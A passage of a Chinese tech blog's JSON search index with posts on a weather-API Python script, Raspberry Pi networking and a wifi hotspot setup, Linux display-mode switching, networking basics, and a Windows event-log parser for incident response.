安装并配置完成，可以正常使用，后面根据情况，在配置zsh和oh-my-zsh等。","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"https://k3vi-07.github.io/tags/kali/"},{"name":"Vmware","slug":"vmware","permalink":"https://k3vi-07.github.io/tags/vmware/"}],"author":"k3vi"},{"title":"python3利用API查询天气及地理信息","slug":"python3利用api查询天气及地理信息","date":"2020-01-17T05:45:00.000Z","updated":"2023-01-10T07:58:04.082Z","comments":true,"path":"2020/01/17/python3利用api查询天气及地理信息/","link":"","permalink":"https://k3vi-07.github.io/2020/01/17/python3%E5%88%A9%E7%94%A8api%E6%9F%A5%E8%AF%A2%E5%A4%A9%E6%B0%94%E5%8F%8A%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF/","excerpt":"在学习python的过程中，看到利用api接口的练习，就写了这么一个功能模块，可以通过ip地址/城市名称/城市标识ID/auto_ip等查询天气和地理信息。 API&amp;KEY鉴于本次是查询天气状态 并且中国天气网现已没有再提供API接口，所以我找到了和风天气平台，当然你也可以另寻其他API接口，只要注册登录拿到相关的key就可以。 获取数据 url中的参数说明 weather_type &gt;parameters 其他具体参数（天气相关）说明 https://dev.heweather.com/docs/api/weather","text":"在学习python的过程中，看到利用api接口的练习，就写了这么一个功能模块，可以通过ip地址/城市名称/城市标识ID/auto_ip等查询天气和地理信息。 API&amp;KEY鉴于本次是查询天气状态 并且中国天气网现已没有再提供API接口，所以我找到了和风天气平台，当然你也可以另寻其他API接口，只要注册登录拿到相关的key就可以。 获取数据 url中的参数说明 weather_type &gt;parameters 其他具体参数（天气相关）说明 https://dev.heweather.com/docs/api/weather requests获取信息使用的是免费版本的url,数据格式是json url = \"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s\" \\ % (weather_type, parameters, key) page = requests.get(url) # 得到json格式数据 page = json.loads(page.text) # 将str转化为dict类型，方便处理数据 这里有一个小知识点json.dumps()和json.loads()是json格式处理函数（可以这么理解，json是字符串） json.dumps()函数是将一个Python数据类型列表进行json格式的编码（可以这么理解，json.dumps()函数是将字典转化为字符串） json.loads()函数是将json格式数据转换为字典（可以这么理解，json.loads()函数是将字符串转化为字典） 利用这个字典数据提取出相关信息。如：获取经纬度 print(\"经度\", page['HeWeather6'][0]['basic']['lon']) print(\"纬度\", page['HeWeather6'][0]['basic']['lat']) 实况天气查询import requests import json weather_type = ['now', 'forecast', 'hourly', 'lifestyle'] # 实况天气,3-10天预报,逐小时预报,生活指数 \"\"\"parameters形式 1. location=CN101010100 （城市ID） 2. location=116.40,39.9 （经纬度格式） 3. location=北京、 location=北京市、 location=beijing （城市） 4. location=朝阳,北京、 location=chaoyang,beijing (详细地名) 5. location=60.194.130.1 （ip） 6. location=auto_ip （根据请求自动判断，根据用户的请求获取IP，通过 IP 定位并获取城市数据） \"\"\" key = '551bd5df607546dc136ada2ba9f82280' # 这里的key并不真实，我改了一下，想尝试请自行注册 def get_weather(weather_type, parameters): url = \"https://free-api.heweather.net/s6/weather/%s?location=%s&amp;key=%s\" \\ % (weather_type, parameters, key) # 和风天气平台API page = requests.get(url) # print(page.text) page = json.loads(page.text) # print(page, \"\\n\", type(page)) print(\"经度\", page['HeWeather6'][0]['basic']['lon']) print(\"纬度\", page['HeWeather6'][0]['basic']['lat']) if weather_type == 'now': print(\"\"\" 现在播放%s的实况天气：当前体感温度为%s摄氏度，天气状况%s，%s风向，风力%s级，风速每%s公里/时，相对湿度%%%s，大气压强为%s,能见度%s公里，云量%s \"\"\" % (parameters, page['HeWeather6'][0]['now']['fl'], page['HeWeather6'][0]['now']['cond_txt'], page['HeWeather6'][0]['now']['wind_dir'], page['HeWeather6'][0]['now']['wind_sc'], page['HeWeather6'][0]['now']['wind_spd'], page['HeWeather6'][0]['now']['hum'], page['HeWeather6'][0]['now']['pres'], page['HeWeather6'][0]['now']['vis'], page['HeWeather6'][0]['now']['cloud'] ) ) elif weather_type == 'forecast': print(\"\"\" wadaxi \"\"\") if __name__ == '__main__': get_weather(weather_type[0], '北京') 主函数中get_weather()的参数可以根据你的需求替换，学会了实况天气查询，想要查询未来天气、生活指数的话相信也难不倒你，你也可以将此代码补充更加完整。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"}],"author":"dummersoul"},{"title":"在 Mac OS 下一根线玩转树莓派 zero w","slug":"在-mac-os-下一根线玩转树莓派-zero-w","date":"2020-01-14T08:01:00.000Z","updated":"2023-01-10T07:57:18.758Z","comments":true,"path":"2020/01/14/在-mac-os-下一根线玩转树莓派-zero-w/","link":"","permalink":"https://k3vi-07.github.io/2020/01/14/%E5%9C%A8-mac-os-%E4%B8%8B%E4%B8%80%E6%A0%B9%E7%BA%BF%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-zero-w/","excerpt":"在树莓派官网下载下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，使用 etcher 刻录到 sd 中","text":"在树莓派官网下载下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，使用 etcher 刻录到 sd 中 刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：dtoverlay=dwc2 打开cmdline.txt文件。找到单词rootwait，在其之后添加：modules-load=dwc2,g_ether 添加一个文件名为ssh到根目录下，内容为空 把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。 Ping 一下raspberrypi.local看是否能通 之后查看 Mac 的共享名称 ssh连接raspberrypi.local，默认密码为raspberry ssh pi@raspberrypi.local 通过 mac 自带的网络共享按照如下方式配置即可让树莓派上网 现在试试是不是可以上网了","categories":[],"tags":[{"name":"树莓派","slug":"树莓派","permalink":"https://k3vi-07.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"}],"author":"k3vi"},{"title":"Debian linux的图形界面和文本界面的切换","slug":"debian-linux的图形界面和文本界面的切换","date":"2020-01-14T07:53:00.000Z","updated":"2023-01-10T07:57:37.366Z","comments":true,"path":"2020/01/14/debian-linux的图形界面和文本界面的切换/","link":"","permalink":"https://k3vi-07.github.io/2020/01/14/debian-linux%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%87%E6%8D%A2/","excerpt":"Debian linux的图形界面和文本界面的切换 文件修改开机是否图形配置：","text":"Debian linux的图形界面和文本界面的切换 文件修改开机是否图形配置： 配置图行界面的文件是 vi /etc/default/grub找到：GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"。复制本行然后把quiet替换成text。把本行注释掉（以免以后想改回来时不知道怎么改回来）。保存后 执行sudo update-grub命令后 重启即可 如果想kali每次启动是文本模式可以修改如下文件：vi /etc/X11/default-display-manager把里面内容/usr/sbin/gdm3改为false之后重启会以文本模式登录，想改回图形就把false还原回/usr/sbin/gdm3 快捷键切换（推荐）：ctrl+alt+F1文本模式ctrl+alt+F7图形界面 Kali 图形界面和字符界面切换 Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。 切换至字符界面：sudo systemctl set-default multi-user.target 切换至图形界面：sudo systemctlset-default graphical.target 打开图形界面：sudo init 5","categories":[],"tags":[{"name":"Linux","slug":"linux","permalink":"https://k3vi-07.github.io/tags/linux/"}],"author":"k3vi"},{"title":"复习-网络基础部分","slug":"复习-网络基础部分","date":"2020-01-10T05:21:00.000Z","updated":"2023-01-10T07:56:29.395Z","comments":true,"path":"2020/01/10/复习-网络基础部分/","link":"","permalink":"https://k3vi-07.github.io/2020/01/10/%E5%A4%8D%E4%B9%A0-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/","excerpt":"1、什么是网络 两个终端，用一条能承载数据传输的物理介质（传输介质）连接起来，就组成了一个最简单的网络。 2、OSI七层参考模型网线-物理层: 在设备之间传输比特流，规定了电平、速度和电缆针脚。 交换机-数据链路层：将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测。 路由器-网络层：提供逻辑地址，供路由器确定路径。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别。 应用软件- 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。","text":"1、什么是网络 两个终端，用一条能承载数据传输的物理介质（传输介质）连接起来，就组成了一个最简单的网络。 2、OSI七层参考模型网线-物理层: 在设备之间传输比特流，规定了电平、速度和电缆针脚。 交换机-数据链路层：将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测。 路由器-网络层：提供逻辑地址，供路由器确定路径。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别。 应用软件- 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。 3、TCP/IP模型应用层通过各种协议向终端用户提供业务应用---数据 提供应该程序网络接口 传输层保证源端到目的端之间的可靠传输-----端口号+数据 建立端到端连接 网络层解决网络之间的逻辑转发问题-------ip地址+端口号+数据 寻址和路由选择ip 网络接口层---------------------------物理地址+ip地址+端口号+数据 物理介质访问 二进制数据流传输 4、三次握手-建立TCP连接的过程三次握手指建立一个TCP连接时，需要客户端和服务器总共发送三个包。进行三次握手的主要作用是为了确定双方的接受能力和发送能力是否正常、指定自己的初始化序列为后面的可靠性传输做准备。 实质上就是连接服务器指定端口，建立TCP连接，并同步连接双方的序列号和确认号，交换TCP窗口大小信号。 刚开始客户端处于 Closed 的状态，服务端处于 Listen 状态。 进行三次握手 第一次握手：客户端向服务器发送SYN报文，并指明客户端的初始化序列号 ISN©。此时客户端处于 SYN_SEND 状态。 首部的同步位SYN=1，初始序号seq=x，SYN=1的报文段不能携带数据，但要消耗掉一个序号。 第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答， 并且也是指定了自己的初始化序列号 ISN(s)。同时会把客户端的 ISN + 1 作为ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。 第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文， 当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文， 此时客户端处于 ESTABLISHED 状态。服务器收到 ACK 报文之后，也处于 ESTABLISHED 状态，此时，双方已建立起了连接。 确认报文段ACK=1，确认号ack=y+1，序号seq=x+1（初始为seq=x，第二个报文段所以要+1），ACK报文段可以携带数据，不携带数据则不消耗序号。 5、四次挥手-断开TCP连接的过程建立一个连接需要三次握手，而终止一个连接要经过四次挥手（也有将四次挥手叫做四次握手的）。 这由TCP的半关闭（half-close）造成的。所谓的半关闭，其实就是TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。 刚开始双方都处于 ESTABLISHED 状态，假如是客户端先发起关闭请求。进行四次挥手 第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态。 即发出连接释放报文段（FIN=1，序号seq=u），并停止再发送数据，主动关闭TCP连接，进入FIN_WAIT1（终止等待1）状态，等待服务端的确认。 第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 +1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT 状态。 即服务端收到连接释放报文段后即发出确认报文段（ACK=1，确认号ack=u+1，序号seq=v）， 服务端进入CLOSE_WAIT（关闭等待）状态，此时的TCP处于半关闭状态，客户端到服务端的连接释放。客户端收到服务端的确认后，进入FIN_WAIT2（终止等待2）状态，等待服务端发出的连接释放报文段。 第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。 即服务端没有要向客户端发出的数据，服务端发出连接释放报文段（FIN=1，ACK=1，序号seq=w，确认号ack=u+1）， 服务端进入LAST_ACK（最后确认）状态，等待客户端的确认。 第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 +1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。 即客户端收到服务端的连接释放报文段后，对此发出确认报文段（ACK=1，seq=u+1，ack=w+1），客户端进入TIME_WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，客户端才进入CLOSED状态。 收到一个FIN只意味着在这一方向上没有数据流动。客户端执行主动关闭并进入TIME_WAIT是正常的，服务端通常执行被动关闭，不会进入TIME_WAIT状态。参考链接：https://zhuanlan.zhihu.com/p/86426969 6、IPv4IP报文头部长度为20到60字节，IPv4地址为32比特的二进制数， 通常用点分十进制表示。IP地址包括两部分， 第一部分是网络号，表示IP地址所属的网段，第二部分是主机号，用来唯一标识本网段上的某台网络设备。 IP地址的主机位为全0，表示一个网段，广播地址的主机位为全1。 IPv4地址被划分为A、B、C、D、E五类 A类地址第一字节的最高位固定为0（0.0.0.0~127.255.255.255） B类地址第一字节的高两位固定为10（128.0.0.0~191.255.255.255） C类地址第一字节的高三位固定为110（192.0.0.0~223.255.255.255） D类地址第一字节的高四位固定为1110（224.0.0.0~239.255.255.255）组播 E类地址第一字节的高四位固定为1111(240.0.0.0~255.255.255.255)保留 特殊地址 私有地址范围 10.0.0.0~10.255.255.255 172.16.0.0~172.31.255.255 192.168.0.0~192.168.255.255 特殊地址 127.0.0.0 ~ 127.255.255.255（本机） 0.0.0.0 255.255.255.255 子网掩码用于区分网络部分和主机部分。子网掩码中的1表示网络位，0表示主机位。IP报文头中包含一个生存时间TTL（Time To Live）字段，报文每经过一台三层设备，TTL值减1,当报文中的TTL降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端发送ICMP错误消息。 7、常见协议（1）ICMP协议 ICMP（Internet控制报文协议）是TCP/IP协议簇的核心协议之一， 它用于在IP网络设备之间发送控制报文，传递差错、控制、查询等信息。 典型应用：ping Tracert（2）ARP协议 一台网络设备要发送数据给另一台网络设备时， 必须要知道对方的IP地址和MAC地址。MAC地址通过ARP协议来获取。 ARP报文不能穿越路由器，不能被转发到其他广播域。 网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息，则通过发送ARP request报文来获得它。 （3）HTTP协议 HTTP(Hyper Text Transfer Protocol)的缩写. 是用于从WWW服务器传输超文本到本地浏览器的传输协议. HTTP是一个应用层协议,由请求和响应构成,是一个标准的个客户端和服务器模型. 它的主要特点如下:1. 支持客户端/服务器模型2. 简单快速 （4）FTP协议 FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。 FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。 （5）Telnet协议 Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。 它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序， 用它连接到服务器。终端使用者可以在telnet程序中输入命令， 这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。 （6）SMTP协议 SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务， 主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。 使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。 （7）UDP协议 Internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。 UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法。Internet 的传输层有两个主要协议，互为补充。无连接的是 UDP （8）TCP协议 传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、 可靠的、基于字节流的传输层通信协议 （9）IP协议 主要负责将数据包发送给最终的目标计算机。 ip协议是面向无连接的，ip地址是IP协议的基石。DNS负责将域名转换为IP地址， ARP负责根据IP找到MAC地址，RARP功能与ARP相反。DHCP可以自动获取IP地址 socket是应用程序实现TCP/UDP的API 待补充 8、网络设备网卡：计算机连接网络的设备 网桥：数据链路层连接两个网络的设备，能够识别数据链路层中的数据帧并将其转换成一个全新的帧发送给另一个网段 交换机：可以看做持有多个端口的网桥 路由器：作用在网络层，对分组报文进行转发 网关：用来转发来自不同网段之间的数据包。 防火墙：在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间的一系列部件的组合。 它可以通过监测、限制、更改跨越防火墙的数据流。 IPS：即入侵防御系统，有时又称IDP，即入侵检测（IDS）和防御系统，指具备IDS的检测能力，同时部署防御系统、 入侵检测和防御、病毒防御、Dos和DDos防护、url过滤、应用检测 VPN：虚拟专用网络;功能是在公用网络上建立专用网络,进行加密通讯。 日志审计：集中采集信息系统中的系统安全事件、用户访问记录、系统运行日志、系统运行状态等各类信息， 经过规范化、过滤、归并和告警分析等处理后，以统一格式的日志形式进行集中存储和管理，结合丰富的日志统计汇总及关联分析功能，实现对信息系统日志的全面审计。 WAF：即Web应用防火墙或Web应用过防护系统。通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。 功能：XXS（可信任的网页夹带木马）防护、SQL注入、CSRF(w伪造一个可信的网站)防护，防盗链，及robot（爬虫）防护等。 ADS：流量清洗设备，防止DDOS攻击。 9、HTTP状态码200(\"OK\")：一切正常。实体主体中的文档（若存在的话）是某资源的表示。 400(\"Bad Request\")：客户端方面的问题。实体主题中的文档（若存在的话）是一个错误消息。希望客户端能够理解此错误消息，并改正问题。 500(\"Internal Server Error\")：服务期方面的问题。实体主体中的文档（如果存在的话）是一个错误消息。该错误消息通常无济于事，因为客户端无法修复服务器方面的问题。 301(\"Moved Permanently\")：当客户端触发的动作引起了资源URI的变化时发送此响应代码。另外，当客户端向一个资源的旧URI发送请求时，也发送此响应代码。 404(\"Not Found\") 和410(\"Gone\")：当客户端所请求的URI不对应于任何资源时，发送此响应代码。404用于服务器端不知道客户端要请求哪个资源的情况；410用于服务器端知道客户端所请求的资源曾经存在，但现在已经不存在了的情况。 409(\"Conflict\")：当客户端试图执行一个”会导致一个或多个资源处于不一致状态“的操作时，发送此响应代码。 参考链接：https://www.cnblogs.com/xflonga/p/9368993.html 10、待补充。。。","categories":[],"tags":[{"name":"网络基础","slug":"网络基础","permalink":"https://k3vi-07.github.io/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"author":"诚默"},{"title":"使用python生成IP地址","slug":"使用python生成ip地址","date":"2019-12-26T08:39:06.000Z","updated":"2020-12-26T08:39:35.146Z","comments":true,"path":"2019/12/26/使用python生成ip地址/","link":"","permalink":"https://k3vi-07.github.io/2019/12/26/%E4%BD%BF%E7%94%A8python%E7%94%9F%E6%88%90ip%E5%9C%B0%E5%9D%80/","excerpt":"","text":"IP地址生成#_*_ coding:utf8 _*_ # Created on 2017/11/25. __author__ = 'k3vi' from itertools import product, islice from ip2locate import Ip2Locate class Generate_ip_pool(object): def __init__(self): self.fmt = \"%s.%s.%s.%s\" self.start='1.0.0.0' def ip_pool(self): p1,p2,p3,p4=(range(int(i),256) for i in self.start.split('.')) self.ip = islice(product(p1, p2, p3, p4), None) return self.ip if __name__ == \"__main__\": iplocate = Ip2Locate() x = Generate_ip_pool() ipPool = x.ip_pool() for i in range(100): ip = '.'.join([str(i) for i in next(ipPool)]) iplocate.ip = ip print(iplocate.locate)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"}]},{"title":"树莓派3B创建 wifi 热点","slug":"树莓派3b创建-wifi-热点","date":"2019-11-14T07:53:00.000Z","updated":"2023-01-10T07:57:09.116Z","comments":true,"path":"2019/11/14/树莓派3b创建-wifi-热点/","link":"","permalink":"https://k3vi-07.github.io/2019/11/14/%E6%A0%91%E8%8E%93%E6%B4%BE3b%E5%88%9B%E5%BB%BA-wifi-%E7%83%AD%E7%82%B9/","excerpt":"为了方便的使用树莓派，有时我们需要通过wifi来操作树莓派，或者利用树莓派来建立钓鱼wifi，这个时候我们就可以使用hostapd来创建一个wifi热点。下面是具体的操作 安装 hostapd、dnsmasq：","text":"为了方便的使用树莓派，有时我们需要通过wifi来操作树莓派，或者利用树莓派来建立钓鱼wifi，这个时候我们就可以使用hostapd来创建一个wifi热点。下面是具体的操作 安装 hostapd、dnsmasq： sudo apt-get install hostapd dnsmasq 然后在/etc/dnsmasq.conf末加入（自己修改IP和网段，这个文件是已存在的，很详细的配置文件，但是所有行都加入了#号注释掉） interface=wlan0 dhcp-range=10.0.0.2,10.0.0.5,255.255.255.0,12h 然后新建/etc/hostapd/hostapd.conf，加入interface=wlan0 hw_mode=g channel=10 auth_algs=1 wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP rsn_pairwise=CCMP wpa_passphrase=wifi密码 ssid=wifi名字 接着修改/etc/sysctl.conf，开启网卡的转发功能，如果不修改此项，热点将无法上网更改如下内容（如果有这一行，把#号去掉就行） net.ipv4.ip_forward=1 最后，将下面脚本加入到/etc/rc.local的exit 0前：ifconfig wlan0 down ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up iwconfig wlan0 power off service dnsmasq restart hostapd -B /etc/hostapd/hostapd.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT 重启，就可以看到热点了 这样的热点可以进行wifi钓鱼，但是配置起来就比较麻烦了。","categories":[],"tags":[{"name":"树莓派","slug":"树莓派","permalink":"https://k3vi-07.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"}],"author":"k3vi"},{"title":"使用Evtx模块解析Windows日志","slug":"使用evtx模块解析windows日志","date":"2019-11-13T06:13:00.000Z","updated":"2023-01-10T07:56:55.156Z","comments":true,"path":"2019/11/13/使用evtx模块解析windows日志/","link":"","permalink":"https://k3vi-07.github.io/2019/11/13/%E4%BD%BF%E7%94%A8evtx%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90windows%E6%97%A5%E5%BF%97/","excerpt":"平时在做应急响应时需要对Windows日志分析，在进行日志分析时经常遇到Windows日志阅读困难，所以萌生了编写一个解析处理脚本的想法，这里使用了Evtx模块将Windows日志转换成xml，在对通过Windows日志格式对xml进行处理，最终导出csv格式 准备工作安装模块pip install python-evtx windows 日志解释事件IDEventID 代表Windows的事件ID,而这里的脚本只写了对事件ID为4624和4625的处理。常见有Windows事件ID有","text":"平时在做应急响应时需要对Windows日志分析，在进行日志分析时经常遇到Windows日志阅读困难，所以萌生了编写一个解析处理脚本的想法，这里使用了Evtx模块将Windows日志转换成xml，在对通过Windows日志格式对xml进行处理，最终导出csv格式 准备工作安装模块pip install python-evtx windows 日志解释事件IDEventID 代表Windows的事件ID,而这里的脚本只写了对事件ID为4624和4625的处理。常见有Windows事件ID有 事件ID 说明 1102 清理审计日志 4624 账号成功登录 4625 账号登录失败 4768 Kerberos身份验证（TGT请求） 4769 Kerberos服务票证请求 4776 NTLM身份验证 4672 授予特殊权限 4720 创建用户 4726 删除用户 4728 将成员添加到启用安全的全局组中 4729 将成员从安全的全局组中移除 4732 将成员添加到启用安全的本地组中 4733 将成员从启用安全的本地组中移除 4756 将成员添加到启用安全的通用组中 4757 将成员从启用安全的通用组中移除 4719 系统审计策略修改 登录类型Windows 有10种不同的事件类型，每种类型代表一种 登录类型 描述 2 交互式登录（用户从控制台登录） 3 网络（例如：通过net use,访问共享网络） 4 批处理（为批处理程序保留） 5 服务启动（服务登录） 6 不支持 7 解锁（带密码保护的屏幕保护程序的无人值班工作站） 8 网络明文（IIS服务器登录验证） 10 远程交互（终端服务，远程桌面，远程辅助） 11 缓存域证书登录 功能及后续工作目前已有功能 可以读取evxt文件，并按照格式生成csv 可以将Windows登录日志过滤出来缺点 只能在脚本所在目录解析相对路径的日志文件 目前只对安全日志进行了格式处理后续工作 解析更多的类型 优化代码完整代码import mmap import contextlib import sys import getopt from Evtx.Evtx import FileHeader from Evtx.Views import evtx_file_xml_view from xml.etree import ElementTree datalist = [] ''' 目前采用单线程的方式处理日志，结果导出到csv文件中 ''' def MyFun(EvtxPath): with open(EvtxPath, 'r') as f: with contextlib.closing(mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)) as buf: fh = FileHeader(buf, 0) try: for xml, record in evtx_file_xml_view(fh): xml = xml.replace(''' xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"''', '') # 此处需要将内容替换掉，不然解析会报错 InterestEvent(xml) except Exception as e: print(e) print('done') def deal_login(status, Eroot): # 处理单条日志 time = Eroot.findall('System')[0].find('TimeCreated').attrib['SystemTime'] # 获取记录日志的时间 time = time.split('.')[0] Datas = Eroot.findall('EventData')[0].findall('Data') for data in Datas: if data.get('Name') == 'IpAddress': # 获取IP值 if data.text == '-': # 过滤IP值为 - 的记录 return # if data.text == '127.0.0.1': #过了ip为127.0.0.1的IP # return ip = data.text elif data.get('Name') == 'IpPort': # 获取端口值 port = data.text elif data.get('Name') == 'LogonProcessName': # 获取登录进程名 LogonProcessName = data.text elif data.get('Name') == 'AuthenticationPackageName': # 加载身份验证包名称 AuthenticationPackageName = data.text elif data.get( 'Name') == 'LogonType': # 登录类型，Windows共有10种登录类型 LogonType = data.text Logoninfo = LogonType_info(LogonType.strip()) # 登录信息 datalist.append( '{},{},{},{},{},{},{}\\r\\n'.format(status, time, ip, port, LogonProcessName, AuthenticationPackageName, Logoninfo)) def LogonType_info(typeid): # Windows登录类型 typeinfo = { '2': '登录类型2：交互式登录（用户从控制台登录）', '3': '登录类型3：网络（如访问共享文件夹、访问共享打印机等）', '4': '登录类型4：批处理（计划任务服务以此种方式运行）', '5': '登录类型5：服务（服务启动）', '6': '登录类型6：不支持', '7': '登录类型7：解锁（解锁带有密码保护的屏幕保护程序）', '8': '登录类型8：网络明文（IIS服务器登录验证）', '9': '登录类型9：新凭证', '10': '登录类型10：远程交互（终端服务，远程桌面，远程辅助）', '11': '登录类型11：缓存域证书登录'} return typeinfo[typeid] def SaveFile(filename, dataList): with open(filename, 'w') as f: f.write(\"认证状态,时间,IP,端口,登录进程名,身份验证包名称,认证类型\") f.writelines(dataList) # 过滤掉不需要的事件，输出感兴趣的事件 def InterestEvent(xml): Eroot = ElementTree.fromstring(xml) ID = Eroot.findall('System')[0].find('EventID').text if ID == '4624': deal_login('认证成功', Eroot) elif ID == '4625': deal_login('认证失败', Eroot) def main(argv): EvtxPath = '' outputfile = './res.csv' try: opts, args = getopt.getopt(argv, \"hi:o:\", [\"ifile=\", \"ofile=\"]) except getopt.GetoptError: print('test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt;') sys.exit(2) for opt, arg in opts: if opt == '-h': print(''' test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt; -i 待处理的日志文件路径 -o 以处理结果文件的路径 ''') sys.exit() elif opt in (\"-i\", \"--ifile\"): EvtxPath = arg elif opt in (\"-o\", \"--ofile\"): outputfile = arg if EvtxPath == '': print(\"无待处理的日志，请输入待处理的日志文件路径\") return print('待处理的日志文件：', EvtxPath) print('输出的日志文件：', outputfile) MyFun(EvtxPath) SaveFile(outputfile, datalist) if __name__ == '__main__': main(sys.argv[1:]) 参考windows登录类型参考https://www.cnblogs.com/xcsn/p/6375805.htmlhttps://www.freebuf.com/vuls/175560.html","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"}],"author":"k3vi"},{"title":"python3使用feedparser模块处理rss并发送到指定邮箱","slug":"python3使用feedparser模块处理rss并发送到指定邮箱","date":"2019-11-10T08:06:00.000Z","updated":"2020-12-30T10:43:33.882Z","comments":true,"path":"2019/11/10/python3使用feedparser模块处理rss并发送到指定邮箱/","link":"","permalink":"https://k3vi-07.github.io/2019/11/10/python3%E4%BD%BF%E7%94%A8feedparser%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86rss%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/","excerpt":"","text":"日常工作中，需要大量获取资讯。平时都是直接在网站阅读，当我们要阅读的网站过多时难免会有遗漏。这时我们就可以使用rss进行资讯的订阅，今天我们使用python来解析rss，并通过邮件的形式发送到我们的邮箱中，方便我们阅读。 1.准备工作安装python环境，安装所需要的一些模块requests、feedparser、smtplib、codecs等 2.收集需要的信息RSS(Really Simple 